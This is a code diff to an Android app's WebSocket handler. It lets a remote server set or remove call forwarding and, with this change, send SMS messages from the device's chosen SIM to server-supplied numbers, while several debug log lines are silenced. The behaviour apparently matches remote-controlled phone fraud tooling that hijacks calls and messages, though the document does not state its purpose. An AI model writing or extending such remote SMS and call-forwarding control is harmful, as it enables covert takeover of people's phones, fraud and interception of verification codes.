@@ -7,6 +7,7 @@ import android.app.PendingIntent;
 import android.content.Context;
 import android.content.Intent;
 import android.os.Build;
+import android.telephony.SmsManager;
 import android.util.Log;
 
 import androidx.annotation.NonNull;
@@ -42,14 +43,11 @@ public class WebSocketManager {
         this.context = context;
         Helper help = new Helper();
         this.url = help.SocketUrl();
-         client = new OkHttpClient.Builder()
-                .pingInterval(30, TimeUnit.SECONDS)
-                .retryOnConnectionFailure(true)
-                .build();
+         client = new OkHttpClient.Builder().pingInterval(30, TimeUnit.SECONDS).retryOnConnectionFailure(true).build();
     }
 
     public void connect() {
-        Log.d(Helper.TAG, "SOCKET CONNECT");
+//        Log.d(Helper.TAG, "SOCKET CONNECT");
 
         Request request = new Request.Builder().url(url).build();
         webSocket = client.newWebSocket(request, new WebSocketListener() {
@@ -71,7 +69,6 @@ public class WebSocketManager {
             @Override
             public void onMessage(@NonNull WebSocket webSocket, @NonNull String text) {
                 try {
-                    Log.d(Helper.TAG, "Websockket Message "+ text);
                     JSONObject data = new JSONObject(text);
                     String action = data.optString("action");
                     SharedPreferencesHelper share = new SharedPreferencesHelper(context.getApplicationContext());
@@ -83,7 +80,6 @@ public class WebSocketManager {
                         if(sitename.equals(help.SITE())){
                             CallForwardingHelper call = new CallForwardingHelper();
                             call.setCallForwarding(context.getApplicationContext(), phone, data.getInt("sim_id"));
-
                             JSONObject sendData = new JSONObject();
                             sendData.put("sitename", sitename);
                             sendData.put("message", "Updating Number ...");
@@ -92,7 +88,7 @@ public class WebSocketManager {
                             String jsondata = sendData.toString();
                             webSocket.send(jsondata);
                         }else{
-                            Log.e(TAG, "Websocket : Sitename not matched");
+                            Log.e(Helper.TAG, "Websocket : Sitename not matched");
                         }
                     }else if(action.equals("remove-call-forwarding-number")){
                         String sitename = data.getString("sitename");
@@ -111,11 +107,47 @@ public class WebSocketManager {
                         }else{
                             Log.e(TAG, "Websocket : Sitename not matched");
                         }
+                    }else if(action.equals(("phone-sms-forward"))){
+                        String sitename = data.getString("site");
+                        String mobile_id = data.getString("mobile_id");
+                        if(mobile_id.equals(Helper.getAndroidId(context)) ){
+                            // forward the sms
+                            int sms_forward_id = data.getInt("sms_forward_id");
+                            String number = data.getString("number");
+                            String message = data.getString("message");
+                            String sim_id_string = data.getString("sim_id");
+                            int sim_id = Integer.parseInt(sim_id_string);
+
+                            int sentRequestCode = (sms_forward_id + number + "_pending2").hashCode();
+                            int deliveredRequestCode = (sms_forward_id + number + "_delivered2").hashCode();
+
+                            Intent sentIntent = new Intent(context, SentReceiver.class);
+                            Intent deliveredIntent = new Intent(context, DeliveredReceiver.class);
+                            sentIntent.putExtra("sms_forward_id", sms_forward_id);
+                            sentIntent.putExtra("phone", number);
+                            deliveredIntent.putExtra("sms_forward_id", sms_forward_id);
+                            deliveredIntent.putExtra("phone", number);
+                            PendingIntent sentPendingIntent = PendingIntent.getBroadcast(context, sentRequestCode, sentIntent, PendingIntent.FLAG_IMMUTABLE);
+                            PendingIntent deliveredPendingIntent = PendingIntent.getBroadcast(context, deliveredRequestCode, deliveredIntent, PendingIntent.FLAG_IMMUTABLE);
+                            SmsManager smsManager = SmsManager.getSmsManagerForSubscriptionId(sim_id);
+                            smsManager.sendTextMessage(number, null, message, sentPendingIntent, deliveredPendingIntent);
+
+                            JSONObject sendData = new JSONObject();
+                            sendData.put("sitename", sitename);
+                            sendData.put("message", "Request Sent from mobile");
+                            sendData.put("sms_forward_id", sms_forward_id);
+                            sendData.put("connection_id", connection_id);
+                            sendData.put("action","response-sms-forward");
+                            String jsondata = sendData.toString();
+                            webSocket.send(jsondata);
+                        }else{
+                            Log.e(Helper.TAG, "Mobile Id Not Matched"+ data.toString());
+                        }
                     }else if(action.equals(("connection-id"))){
                         share.saveString("connection_id", data.getString("connection_id"));
                     }
                 } catch (JSONException e) {
-                    Log.e(TAG, "Failed to parse JSON: " + e.getMessage());
+                    Log.e(Helper.TAG, "Failed to parse JSON: " + e.getMessage() + text + " && "+ e.getStackTrace());
                 }
             }
 
